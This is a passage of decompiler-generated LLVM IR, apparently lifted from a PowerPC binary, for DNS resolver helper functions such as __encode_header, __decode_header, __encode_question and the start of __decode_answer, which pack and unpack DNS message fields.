  uselistorder i32 %v0_10027b4c, { 1, 0 }
  uselistorder i32 %v0_10027aa4, { 1, 0, 2, 3 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7 }
  uselistorder i32* %r28.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32 ()* @__GI_memset, { 85, 7, 2, 9, 8, 6, 0, 3, 80, 31, 84, 83, 82, 81, 10, 29, 89, 88, 87, 86, 1, 4, 92, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 91, 90, 51, 50, 49, 48, 14, 13, 12, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 30, 28, 27, 5, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 11 }
  uselistorder i32 (i32*, i32*)* @xdr_u_int, { 4, 3, 2, 0, 1, 5 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10027b48, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_10027b44, { 1, 0 }
  uselistorder label %dec_label_pc_10027b3c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10027af8, { 1, 0 }
  uselistorder label %dec_label_pc_10027adc, { 2, 0, 1 }
}

define i32 @__encode_header(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 -1, i32* %r6.global-to-local, align 4
  %tmp2 = icmp slt i32 %arg3, 12
  br i1 %tmp2, label %dec_label_pc_10027c44, label %dec_label_pc_10027b6c

dec_label_pc_10027b6c:                            ; preds = %entry
  %tmp3 = inttoptr i32 %arg2 to i8*
  %v1_10027b6c = add i32 %tmp, 2
  %v2_10027b6c = inttoptr i32 %v1_10027b6c to i8*
  %v3_10027b6c = load i8, i8* %v2_10027b6c, align 1
  store i32 12, i32* %r6.global-to-local, align 4
  store i8 %v3_10027b6c, i8* %tmp3, align 1
  %v2_10027b78 = load i32, i32* %arg1, align 4
  %v1_10027b7c = trunc i32 %v2_10027b78 to i8
  %v4_10027b7c = add i32 %arg2, 1
  %v5_10027b7c = inttoptr i32 %v4_10027b7c to i8*
  store i8 %v1_10027b7c, i8* %v5_10027b7c, align 1
  %v1_10027b80 = add i32 %tmp, 12
  %v2_10027b80 = inttoptr i32 %v1_10027b80 to i32*
  %v3_10027b80 = load i32, i32* %v2_10027b80, align 4
  %v1_10027b84 = add i32 %tmp, 16
  %v2_10027b84 = inttoptr i32 %v1_10027b84 to i32*
  %v3_10027b84 = load i32, i32* %v2_10027b84, align 4
  store i32 %v3_10027b84, i32* %r11.global-to-local, align 4
  %v1_10027b88 = add i32 %tmp, 4
  %v2_10027b88 = inttoptr i32 %v1_10027b88 to i32*
  %v3_10027b88 = load i32, i32* %v2_10027b88, align 4
  %v1_10027b8c = add i32 %tmp, 8
  %v2_10027b8c = inttoptr i32 %v1_10027b8c to i32*
  %v3_10027b8c = load i32, i32* %v2_10027b8c, align 4
  %v1_10027b90 = add i32 %tmp, 20
  %v2_10027b90 = inttoptr i32 %v1_10027b90 to i32*
  %v3_10027b90 = load i32, i32* %v2_10027b90, align 4
  store i32 %v3_10027b90, i32* %r7.global-to-local, align 4
  %v2_10027b94 = icmp ne i32 %v3_10027b80, 0
  %v5_10027b98 = zext i1 %v2_10027b94 to i32
  store i32 %v5_10027b98, i32* %r10.global-to-local, align 4
  %not.v2_10027b9c = icmp eq i32 %v3_10027b88, 0
  %v6_10027ba0 = sext i1 %not.v2_10027b9c to i32
  %v2_10027ba4 = icmp ne i32 %v3_10027b84, 0
  %v5_10027ba8 = zext i1 %v2_10027ba4 to i32
  store i32 %v5_10027ba8, i32* %r11.global-to-local, align 4
  %v1_10027bb0 = call i32 @__asm_rlwinm(i32 %v6_10027ba0, i32 0, i32 24, i32 24)
  %v0_10027bb4 = load i32, i32* %r10.global-to-local, align 4
  %v1_10027bb4 = mul i32 %v0_10027bb4, 4
  store i32 %v1_10027bb4, i32* %r10.global-to-local, align 4
  %v1_10027bb8 = call i32 @__asm_rlwinm(i32 %v3_10027b8c, i32 3, i32 25, i32 28)
  store i32 %v1_10027bb8, i32* @r8, align 4
  %v1_10027bbc = add i32 %v1_10027bb0, 128
  %v0_10027bc0 = load i32, i32* %r7.global-to-local, align 4
  %v2_10027bc0 = icmp ne i32 %v0_10027bc0, 0
  %v5_10027bc4 = zext i1 %v2_10027bc0 to i32
  %v0_10027bc8 = load i32, i32* %r10.global-to-local, align 4
  %v2_10027bc8 = or i32 %v0_10027bc8, %v1_10027bb8
  store i32 %v2_10027bc8, i32* @r10, align 4
  %v0_10027bcc = load i32, i32* %r11.global-to-local, align 4
  %v1_10027bcc = mul i32 %v0_10027bcc, 2
  store i32 %v1_10027bcc, i32* %r11.global-to-local, align 4
  %v2_10027bd0 = or i32 %v2_10027bc8, %v5_10027bc4
  %v2_10027bd4 = or i32 %v2_10027bd0, %v1_10027bbc
  %v2_10027bd8 = or i32 %v2_10027bd4, %v1_10027bcc
  %v1_10027bdc = trunc i32 %v2_10027bd8 to i8
  %v4_10027bdc = add i32 %arg2, 2
  %v5_10027bdc = inttoptr i32 %v4_10027bdc to i8*
  store i8 %v1_10027bdc, i8* %v5_10027bdc, align 1
  %v1_10027be0 = add i32 %tmp, 24
  %v2_10027be0 = inttoptr i32 %v1_10027be0 to i32*
  %v3_10027be0 = load i32, i32* %v2_10027be0, align 4
  %v1_10027be4 = add i32 %tmp, 28
  %v2_10027be4 = inttoptr i32 %v1_10027be4 to i32*
  %v3_10027be4 = load i32, i32* %v2_10027be4, align 4
  %not.v2_10027be8 = icmp eq i32 %v3_10027be0, 0
  %v6_10027bec = sext i1 %not.v2_10027be8 to i32
  %v1_10027bf0 = call i32 @__asm_rlwinm(i32 %v6_10027bec, i32 0, i32 24, i32 24)
  %v1_10027bf4 = urem i32 %v3_10027be4, 16
  %v1_10027bf8 = add i32 %v1_10027bf0, 128
  %v2_10027bfc = or i32 %v1_10027bf4, %v1_10027bf8
  %v1_10027c00 = trunc i32 %v2_10027bfc to i8
  %v4_10027c00 = add i32 %arg2, 3
  %v5_10027c00 = inttoptr i32 %v4_10027c00 to i8*
  store i8 %v1_10027c00, i8* %v5_10027c00, align 1
  %v1_10027c04 = add i32 %tmp, 34
  %v2_10027c04 = inttoptr i32 %v1_10027c04 to i8*
  %v3_10027c04 = load i8, i8* %v2_10027c04, align 1
  %v4_10027c08 = add i32 %arg2, 4
  %v5_10027c08 = inttoptr i32 %v4_10027c08 to i8*
  store i8 %v3_10027c04, i8* %v5_10027c08, align 1
  %v1_10027c0c = add i32 %tmp, 32
  %v2_10027c0c = inttoptr i32 %v1_10027c0c to i32*
  %v3_10027c0c = load i32, i32* %v2_10027c0c, align 4
  %v1_10027c10 = trunc i32 %v3_10027c0c to i8
  %v4_10027c10 = add i32 %arg2, 5
  %v5_10027c10 = inttoptr i32 %v4_10027c10 to i8*
  store i8 %v1_10027c10, i8* %v5_10027c10, align 1
  %v1_10027c14 = add i32 %tmp, 38
  %v2_10027c14 = inttoptr i32 %v1_10027c14 to i8*
  %v3_10027c14 = load i8, i8* %v2_10027c14, align 1
  %v4_10027c18 = add i32 %arg2, 6
  %v5_10027c18 = inttoptr i32 %v4_10027c18 to i8*
  store i8 %v3_10027c14, i8* %v5_10027c18, align 1
  %v1_10027c1c = add i32 %tmp, 36
  %v2_10027c1c = inttoptr i32 %v1_10027c1c to i32*
  %v3_10027c1c = load i32, i32* %v2_10027c1c, align 4
  %v1_10027c20 = trunc i32 %v3_10027c1c to i8
  %v4_10027c20 = add i32 %arg2, 7
  %v5_10027c20 = inttoptr i32 %v4_10027c20 to i8*
  store i8 %v1_10027c20, i8* %v5_10027c20, align 1
  %v1_10027c24 = add i32 %tmp, 42
  %v2_10027c24 = inttoptr i32 %v1_10027c24 to i8*
  %v3_10027c24 = load i8, i8* %v2_10027c24, align 1
  %v4_10027c28 = add i32 %arg2, 8
  %v5_10027c28 = inttoptr i32 %v4_10027c28 to i8*
  store i8 %v3_10027c24, i8* %v5_10027c28, align 1
  %v1_10027c2c = add i32 %tmp, 40
  %v2_10027c2c = inttoptr i32 %v1_10027c2c to i32*
  %v3_10027c2c = load i32, i32* %v2_10027c2c, align 4
  %v1_10027c30 = trunc i32 %v3_10027c2c to i8
  %v4_10027c30 = add i32 %arg2, 9
  %v5_10027c30 = inttoptr i32 %v4_10027c30 to i8*
  store i8 %v1_10027c30, i8* %v5_10027c30, align 1
  %v1_10027c34 = add i32 %tmp, 46
  %v2_10027c34 = inttoptr i32 %v1_10027c34 to i8*
  %v3_10027c34 = load i8, i8* %v2_10027c34, align 1
  %v4_10027c38 = add i32 %arg2, 10
  %v5_10027c38 = inttoptr i32 %v4_10027c38 to i8*
  store i8 %v3_10027c34, i8* %v5_10027c38, align 1
  %v1_10027c3c = add i32 %tmp, 44
  %v2_10027c3c = inttoptr i32 %v1_10027c3c to i32*
  %v3_10027c3c = load i32, i32* %v2_10027c3c, align 4
  %v1_10027c40 = trunc i32 %v3_10027c3c to i8
  %v4_10027c40 = add i32 %arg2, 11
  %v5_10027c40 = inttoptr i32 %v4_10027c40 to i8*
  store i8 %v1_10027c40, i8* %v5_10027c40, align 1
  %v0_10027c44.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10027c44

dec_label_pc_10027c44:                            ; preds = %entry, %dec_label_pc_10027b6c
  %v0_10027c44 = phi i32 [ -1, %entry ], [ %v0_10027c44.pre, %dec_label_pc_10027b6c ]
  ret i32 %v0_10027c44

; uselistorder directives
  uselistorder i32 %v1_10027bcc, { 1, 0 }
  uselistorder i32 %tmp, { 0, 15, 14, 13, 1, 6, 9, 8, 12, 11, 10, 3, 2, 5, 4, 7 }
  uselistorder i32 38, { 10, 2, 5, 11, 6, 7, 8, 9, 0, 1, 3, 4 }
  uselistorder i32 128, { 0, 1, 8, 7, 34, 23, 40, 41, 44, 5, 36, 38, 53, 54, 32, 45, 42, 46, 47, 6, 48, 24, 49, 50, 51, 2, 33, 52, 37, 43, 35, 30, 31, 3, 39, 4, 9, 11, 10, 25, 12, 14, 13, 26, 15, 17, 16, 27, 19, 18, 28, 20, 22, 21, 29 }
  uselistorder label %dec_label_pc_10027c44, { 1, 0 }
}

define i32 @__decode_header(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_10027c4c = load i8, i8* %arg1, align 1
  %v4_10027c4c = zext i8 %v3_10027c4c to i32
  store i32 %tmp, i32* %r9.global-to-local, align 4
  %v2_10027c54 = add i32 %tmp, 1
  %v3_10027c54 = inttoptr i32 %v2_10027c54 to i8*
  %v4_10027c54 = load i8, i8* %v3_10027c54, align 1
  %v5_10027c54 = zext i8 %v4_10027c54 to i32
  %v1_10027c5c = mul nuw nsw i32 %v4_10027c4c, 256
  %v2_10027c60 = or i32 %v5_10027c54, %v1_10027c5c
  %v2_10027c64 = inttoptr i32 %arg2 to i32*
  store i32 %v2_10027c60, i32* %v2_10027c64, align 4
  %v0_10027c68 = load i32, i32* %r9.global-to-local, align 4
  %v1_10027c68 = add i32 %v0_10027c68, 2
  %v2_10027c68 = inttoptr i32 %v1_10027c68 to i8*
  %v3_10027c68 = load i8, i8* %v2_10027c68, align 1
  %v4_10027c68 = zext i8 %v3_10027c68 to i32
  %v1_10027c6c = call i32 @__asm_rlwinm(i32 %v4_10027c68, i32 25, i32 31, i32 31)
  %v2_10027c70 = add i32 %arg2, 4
  %v3_10027c70 = inttoptr i32 %v2_10027c70 to i32*
  store i32 %v1_10027c6c, i32* %v3_10027c70, align 4
  %v0_10027c74 = load i32, i32* %r9.global-to-local, align 4
  %v1_10027c74 = add i32 %v0_10027c74, 2
  %v2_10027c74 = inttoptr i32 %v1_10027c74 to i8*
  %v3_10027c74 = load i8, i8* %v2_10027c74, align 1
  %v4_10027c74 = zext i8 %v3_10027c74 to i32
  %v1_10027c78 = call i32 @__asm_rlwinm(i32 %v4_10027c74, i32 29, i32 28, i32 31)
  %v2_10027c7c = add i32 %arg2, 8
  %v3_10027c7c = inttoptr i32 %v2_10027c7c to i32*
  store i32 %v1_10027c78, i32* %v3_10027c7c, align 4
  %v0_10027c80 = load i32, i32* %r9.global-to-local, align 4
  %v1_10027c80 = add i32 %v0_10027c80, 2
  %v2_10027c80 = inttoptr i32 %v1_10027c80 to i8*
  %v3_10027c80 = load i8, i8* %v2_10027c80, align 1
  %v4_10027c80 = zext i8 %v3_10027c80 to i32
  %v1_10027c84 = call i32 @__asm_rlwinm(i32 %v4_10027c80, i32 30, i32 31, i32 31)
  %v2_10027c88 = add i32 %arg2, 12
  %v3_10027c88 = inttoptr i32 %v2_10027c88 to i32*
  store i32 %v1_10027c84, i32* %v3_10027c88, align 4
  %v0_10027c8c = load i32, i32* %r9.global-to-local, align 4
  %v1_10027c8c = add i32 %v0_10027c8c, 2
  %v2_10027c8c = inttoptr i32 %v1_10027c8c to i8*
  %v3_10027c8c = load i8, i8* %v2_10027c8c, align 1
  %v4_10027c8c = zext i8 %v3_10027c8c to i32
  %v1_10027c90 = call i32 @__asm_rlwinm(i32 %v4_10027c8c, i32 31, i32 31, i32 31)
  %v2_10027c94 = add i32 %arg2, 16
  %v3_10027c94 = inttoptr i32 %v2_10027c94 to i32*
  store i32 %v1_10027c90, i32* %v3_10027c94, align 4
  %v0_10027c98 = load i32, i32* %r9.global-to-local, align 4
  %v1_10027c98 = add i32 %v0_10027c98, 2
  %v2_10027c98 = inttoptr i32 %v1_10027c98 to i8*
  %v3_10027c98 = load i8, i8* %v2_10027c98, align 1
  %tmp1 = urem i8 %v3_10027c98, 2
  %v1_10027c9c = zext i8 %tmp1 to i32
  %v2_10027ca0 = add i32 %arg2, 20
  %v3_10027ca0 = inttoptr i32 %v2_10027ca0 to i32*
  store i32 %v1_10027c9c, i32* %v3_10027ca0, align 4
  %v0_10027ca4 = load i32, i32* %r9.global-to-local, align 4
  %v1_10027ca4 = add i32 %v0_10027ca4, 3
  %v2_10027ca4 = inttoptr i32 %v1_10027ca4 to i8*
  %v3_10027ca4 = load i8, i8* %v2_10027ca4, align 1
  %v4_10027ca4 = zext i8 %v3_10027ca4 to i32
  %v1_10027ca8 = call i32 @__asm_rlwinm(i32 %v4_10027ca4, i32 25, i32 31, i32 31)
  %v2_10027cac = add i32 %arg2, 24
  %v3_10027cac = inttoptr i32 %v2_10027cac to i32*
  store i32 %v1_10027ca8, i32* %v3_10027cac, align 4
  %v0_10027cb0 = load i32, i32* %r9.global-to-local, align 4
  %v1_10027cb0 = add i32 %v0_10027cb0, 3
  %v2_10027cb0 = inttoptr i32 %v1_10027cb0 to i8*
  %v3_10027cb0 = load i8, i8* %v2_10027cb0, align 1
  %tmp2 = urem i8 %v3_10027cb0, 16
  %v1_10027cb4 = zext i8 %tmp2 to i32
  %v2_10027cb8 = add i32 %arg2, 28
  %v3_10027cb8 = inttoptr i32 %v2_10027cb8 to i32*
  store i32 %v1_10027cb4, i32* %v3_10027cb8, align 4
  %v0_10027cbc = load i32, i32* %r9.global-to-local, align 4
  %v1_10027cbc = add i32 %v0_10027cbc, 4
  %v2_10027cbc = inttoptr i32 %v1_10027cbc to i8*
  %v3_10027cbc = load i8, i8* %v2_10027cbc, align 1
  %v4_10027cbc = zext i8 %v3_10027cbc to i32
  %v1_10027cc0 = add i32 %v0_10027cbc, 5
  %v2_10027cc0 = inttoptr i32 %v1_10027cc0 to i8*
  %v3_10027cc0 = load i8, i8* %v2_10027cc0, align 1
  %v4_10027cc0 = zext i8 %v3_10027cc0 to i32
  %v1_10027cc4 = mul nuw nsw i32 %v4_10027cbc, 256
  %v2_10027cc8 = or i32 %v4_10027cc0, %v1_10027cc4
  %v2_10027ccc = add i32 %arg2, 32
  %v3_10027ccc = inttoptr i32 %v2_10027ccc to i32*
  store i32 %v2_10027cc8, i32* %v3_10027ccc, align 4
  %v0_10027cd0 = load i32, i32* %r9.global-to-local, align 4
  %v1_10027cd0 = add i32 %v0_10027cd0, 6
  %v2_10027cd0 = inttoptr i32 %v1_10027cd0 to i8*
  %v3_10027cd0 = load i8, i8* %v2_10027cd0, align 1
  %v4_10027cd0 = zext i8 %v3_10027cd0 to i32
  %v1_10027cd4 = add i32 %v0_10027cd0, 7
  %v2_10027cd4 = inttoptr i32 %v1_10027cd4 to i8*
  %v3_10027cd4 = load i8, i8* %v2_10027cd4, align 1
  %v4_10027cd4 = zext i8 %v3_10027cd4 to i32
  %v1_10027cd8 = mul nuw nsw i32 %v4_10027cd0, 256
  %v2_10027cdc = or i32 %v4_10027cd4, %v1_10027cd8
  %v2_10027ce0 = add i32 %arg2, 36
  %v3_10027ce0 = inttoptr i32 %v2_10027ce0 to i32*
  store i32 %v2_10027cdc, i32* %v3_10027ce0, align 4
  %v0_10027ce4 = load i32, i32* %r9.global-to-local, align 4
  %v1_10027ce4 = add i32 %v0_10027ce4, 8
  %v2_10027ce4 = inttoptr i32 %v1_10027ce4 to i8*
  %v3_10027ce4 = load i8, i8* %v2_10027ce4, align 1
  %v4_10027ce4 = zext i8 %v3_10027ce4 to i32
  %v1_10027ce8 = add i32 %v0_10027ce4, 9
  %v2_10027ce8 = inttoptr i32 %v1_10027ce8 to i8*
  %v3_10027ce8 = load i8, i8* %v2_10027ce8, align 1
  %v4_10027ce8 = zext i8 %v3_10027ce8 to i32
  %v1_10027cec = mul nuw nsw i32 %v4_10027ce4, 256
  %v2_10027cf0 = or i32 %v4_10027ce8, %v1_10027cec
  %v2_10027cf4 = add i32 %arg2, 40
  %v3_10027cf4 = inttoptr i32 %v2_10027cf4 to i32*
  store i32 %v2_10027cf0, i32* %v3_10027cf4, align 4
  %v0_10027cf8 = load i32, i32* %r9.global-to-local, align 4
  %v1_10027cf8 = add i32 %v0_10027cf8, 10
  %v2_10027cf8 = inttoptr i32 %v1_10027cf8 to i8*
  %v3_10027cf8 = load i8, i8* %v2_10027cf8, align 1
  %v4_10027cf8 = zext i8 %v3_10027cf8 to i32
  %v1_10027cfc = add i32 %v0_10027cf8, 11
  %v2_10027cfc = inttoptr i32 %v1_10027cfc to i8*
  %v3_10027cfc = load i8, i8* %v2_10027cfc, align 1
  %v4_10027cfc = zext i8 %v3_10027cfc to i32
  store i32 %v4_10027cfc, i32* %r9.global-to-local, align 4
  %v1_10027d00 = mul nuw nsw i32 %v4_10027cf8, 256
  %v2_10027d04 = or i32 %v4_10027cfc, %v1_10027d00
  %v2_10027d08 = add i32 %arg2, 44
  %v3_10027d08 = inttoptr i32 %v2_10027d08 to i32*
  store i32 %v2_10027d04, i32* %v3_10027d08, align 4
  ret i32 12

; uselistorder directives
  uselistorder i32 11, { 22, 23, 24, 32, 13, 7, 25, 33, 8, 14, 15, 26, 3, 4, 27, 28, 29, 30, 31, 5, 0, 16, 9, 10, 1, 12, 2, 11, 6, 17, 18, 19, 20, 21 }
  uselistorder i32 40, { 21, 22, 25, 27, 24, 12, 13, 14, 15, 10, 26, 8, 9, 23, 0, 16, 17, 28, 29, 30, 31, 32, 19, 18, 1, 11, 20, 2, 4, 3, 6, 5, 7 }
  uselistorder i32 7, { 31, 32, 38, 15, 0, 3, 10, 11, 12, 13, 14, 34, 35, 36, 37, 4, 2, 5, 6, 16, 7, 17, 8, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 1, 28, 29, 30, 33, 9 }
  uselistorder i8 2, { 1, 8, 3, 2, 4, 0, 5, 9, 6, 10, 7, 11 }
  uselistorder i32 30, { 28, 19, 20, 25, 15, 16, 17, 18, 29, 30, 31, 32, 33, 34, 35, 36, 37, 1, 2, 3, 21, 22, 23, 24, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 26, 27, 0 }
  uselistorder i32 28, { 80, 81, 82, 83, 97, 84, 99, 111, 112, 85, 0, 86, 87, 88, 6, 7, 27, 28, 29, 30, 31, 32, 33, 16, 17, 18, 98, 100, 74, 34, 8, 9, 10, 35, 65, 66, 19, 20, 1, 21, 22, 23, 24, 89, 90, 91, 92, 93, 101, 102, 103, 104, 105, 106, 109, 107, 108, 2, 110, 115, 94, 41, 116, 117, 36, 37, 11, 12, 13, 14, 25, 26, 120, 121, 118, 119, 113, 114, 38, 39, 40, 42, 43, 44, 45, 46, 47, 15, 48, 49, 50, 51, 52, 53, 3, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 67, 68, 69, 70, 71, 72, 73, 75, 76, 77, 78, 4, 5, 79, 95, 96 }
  uselistorder i32 29, { 28, 4, 5, 8, 6, 7, 36, 37, 9, 10, 11, 12, 13, 33, 34, 31, 32, 29, 30, 35, 40, 41, 43, 44, 38, 39, 24, 25, 2, 3, 47, 48, 45, 46, 22, 23, 14, 15, 16, 17, 18, 19, 20, 42, 1, 21, 0, 26, 27 }
  uselistorder i32 31, { 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 37, 38, 3, 4, 2, 0, 32, 33, 39, 40, 41, 19, 20, 5, 6, 1, 13, 7, 17, 18, 10, 11, 12, 42, 43, 44, 57, 58, 55, 56, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 34, 36, 14, 15, 16, 9, 8, 21, 35 }
  uselistorder i32 %arg2, { 0, 1, 7, 2, 3, 4, 11, 10, 9, 8, 5, 6 }
}

define i32 @__encode_question(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @r30, align 4
  %v2_10027d2c = load i32, i32* %arg1, align 4
  store i32 %v2_10027d2c, i32* %r3.global-to-local, align 4
  store i32 268598580, i32* @lr, align 4
  %v1_10027d30 = inttoptr i32 %v2_10027d2c to i8*
  %v2_10027d30 = call i32 @__encode_dotted(i8* %v1_10027d30)
  store i32 %v2_10027d30, i32* %r3.global-to-local, align 4
  %v1_10027d34 = icmp slt i32 %v2_10027d30, 0
  %v1_10027d38 = load i32, i32* @r29, align 4
  %v2_10027d38 = sub i32 %v1_10027d38, %v2_10027d30
  store i32 %v2_10027d38, i32* @r29, align 4
  br i1 %v1_10027d34, label %dec_label_pc_10027d78, label %dec_label_pc_10027d44

dec_label_pc_10027d44:                            ; preds = %entry
  %v2_10027d3c = icmp sgt i32 %v2_10027d38, 3
  %v0_10027d44 = load i32, i32* @r30, align 4
  %v2_10027d44 = add i32 %v0_10027d44, %v2_10027d30
  store i32 %v2_10027d44, i32* %r9.global-to-local, align 4
  br i1 %v2_10027d3c, label %dec_label_pc_10027d54, label %dec_label_pc_10027d4c

dec_label_pc_10027d4c:                            ; preds = %dec_label_pc_10027d44
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10027d78

dec_label_pc_10027d54:                            ; preds = %dec_label_pc_10027d44
  %v0_10027d54 = load i32, i32* @r31, align 4
  %v1_10027d54 = add i32 %v0_10027d54, 6
  %v2_10027d54 = inttoptr i32 %v1_10027d54 to i8*
  %v3_10027d54 = load i8, i8* %v2_10027d54, align 1
  %v5_10027d58 = inttoptr i32 %v2_10027d44 to i8*
  store i8 %v3_10027d54, i8* %v5_10027d58, align 1
  %v0_10027d5c = load i32, i32* %r3.global-to-local, align 4
  %v1_10027d5c = add i32 %v0_10027d5c, 4
  store i32 %v1_10027d5c, i32* %r3.global-to-local, align 4
  %v0_10027d60 = load i32, i32* @r31, align 4
  %v1_10027d60 = add i32 %v0_10027d60, 4
  %v2_10027d60 = inttoptr i32 %v1_10027d60 to i32*
  %v3_10027d60 = load i32, i32* %v2_10027d60, align 4
  %v1_10027d64 = trunc i32 %v3_10027d60 to i8
  %v2_10027d64 = load i32, i32* %r9.global-to-local, align 4
  %v3_10027d64 = add i32 %v2_10027d64, 1
  %v4_10027d64 = inttoptr i32 %v3_10027d64 to i8*
  store i8 %v1_10027d64, i8* %v4_10027d64, align 1
  %v0_10027d68 = load i32, i32* @r31, align 4
  %v1_10027d68 = add i32 %v0_10027d68, 10
  %v2_10027d68 = inttoptr i32 %v1_10027d68 to i8*
  %v3_10027d68 = load i8, i8* %v2_10027d68, align 1
  %v2_10027d6c = load i32, i32* %r9.global-to-local, align 4
  %v3_10027d6c = add i32 %v2_10027d6c, 2
  %v4_10027d6c = inttoptr i32 %v3_10027d6c to i8*
  store i8 %v3_10027d68, i8* %v4_10027d6c, align 1
  %v0_10027d70 = load i32, i32* @r31, align 4
  %v1_10027d70 = add i32 %v0_10027d70, 8
  %v2_10027d70 = inttoptr i32 %v1_10027d70 to i32*
  %v3_10027d70 = load i32, i32* %v2_10027d70, align 4
  %v1_10027d74 = trunc i32 %v3_10027d70 to i8
  %v2_10027d74 = load i32, i32* %r9.global-to-local, align 4
  %v3_10027d74 = add i32 %v2_10027d74, 3
  %v4_10027d74 = inttoptr i32 %v3_10027d74 to i8*
  store i8 %v1_10027d74, i8* %v4_10027d74, align 1
  %v0_10027d88.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10027d78

dec_label_pc_10027d78:                            ; preds = %entry, %dec_label_pc_10027d4c, %dec_label_pc_10027d54
  %v0_10027d88 = phi i32 [ %v2_10027d30, %entry ], [ -1, %dec_label_pc_10027d4c ], [ %v0_10027d88.pre, %dec_label_pc_10027d54 ]
  ret i32 %v0_10027d88

; uselistorder directives
  uselistorder i32 %v2_10027d30, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 5, 3, 6, 4, 0 }
  uselistorder label %dec_label_pc_10027d78, { 2, 1, 0 }
}

define i32 @__length_question(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 268598684, i32* @lr, align 4
  %v0_10027d98 = call i32 @__length_dotted()
  %v1_10027d9c = icmp slt i32 %v0_10027d98, 0
  br i1 %v1_10027d9c, label %dec_label_pc_10027da8, label %dec_label_pc_10027da4

dec_label_pc_10027da4:                            ; preds = %entry
  %v1_10027da4 = add i32 %v0_10027d98, 4
  br label %dec_label_pc_10027da8

dec_label_pc_10027da8:                            ; preds = %entry, %dec_label_pc_10027da4
  %v0_10027db4 = phi i32 [ %v0_10027d98, %entry ], [ %v1_10027da4, %dec_label_pc_10027da4 ]
  ret i32 %v0_10027db4

; uselistorder directives
  uselistorder label %dec_label_pc_10027da8, { 1, 0 }
}

define i32 @__decode_answer(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg4 to i32
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* @r4, align 4
  %stack_var_-280 = alloca i32, align 4
  %v0_10027dbc = load i32, i32* @lr, align 4
  store i32 %v0_10027dbc, i32* %r0.global-to-local, align 4
  %v2_10027dc4 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_10027dc4, i32* @r30, align 4
  store i32 %arg3, i32* @r29, align 4
  store i32 %tmp, i32* @r31, align 4
  store i32 %v2_10027dc4, i32* %r5.global-to-local, align 4
  store i32 256, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* @r28, align 4
  store i32 268598760, i32* @lr, align 4
  %v4_10027de4 = call i32 @__decode_dotted(i32 %v2_10027dc4, i32 256, i32 %v2_10027dc4, i32 256)
  store i32 %v4_10027de4, i32* @r27, align 4
  %v1_10027de8 = icmp slt i32 %v4_10027de4, 0
  %v0_10027dec = load i32, i32* @r28, align 4
  %v2_10027dec = add i32 %v0_10027dec, %v4_10027de4
  store i32 %v2_10027dec, i32* @r28, align 4
  %v1_10027df0 = load i32, i32* @r29, align 4
  %v2_10027df0 = sub i32 %v1_10027df0, %v2_10027dec
  %v1_10027df4 = add i32 %v2_10027df0, -10
  store i32 %v1_10027df4, i32* @r29, align 4
  br i1 %v1_10027de8, label %dec_label_pc_10027eb0, label %dec_label_pc_10027e00

dec_label_pc_10027e00:                            ; preds = %entry
  %v0_10027e04 = load i32, i32* @r26, align 4
  %v2_10027e04 = add i32 %v0_10027e04, %v2_10027dec
  store i32 %v2_10027e04, i32* @r30, align 4
  %tmp6 = icmp sgt i32 %v1_10027df4, -1
  br i1 %tmp6, label %dec_label_pc_10027e14, label %dec_label_pc_10027e0c

dec_label_pc_10027e0c:                            ; preds = %dec_label_pc_10027e00
  store i32 %v1_10027df4, i32* @r27, align 4
  br label %dec_label_pc_10027eb0

dec_label_pc_10027e14:                            ; preds = %dec_label_pc_10027e00
  store i32 268598808, i32* @lr, align 4
  %v1_10027e14 = call i32 @__GI_strdup(i32 %v2_10027dc4)
  %v0_10027e18 = load i32, i32* @r30, align 4
  %v1_10027e18 = add i32 %v0_10027e18, 2
  store i32 %v1_10027e18, i32* @r8, align 4
  %v1_10027e1c = load i32, i32* @r31, align 4
  %v2_10027e1c = inttoptr i32 %v1_10027e1c to i32*
  store i32 %v1_10027e14, i32* %v2_10027e1c, align 4
  %v0_10027e20 = load i32, i32* @r8, align 4
  %v1_10027e20 = add i32 %v0_10027e20, 2
  store i32 %v1_10027e20, i32* @r10, align 4
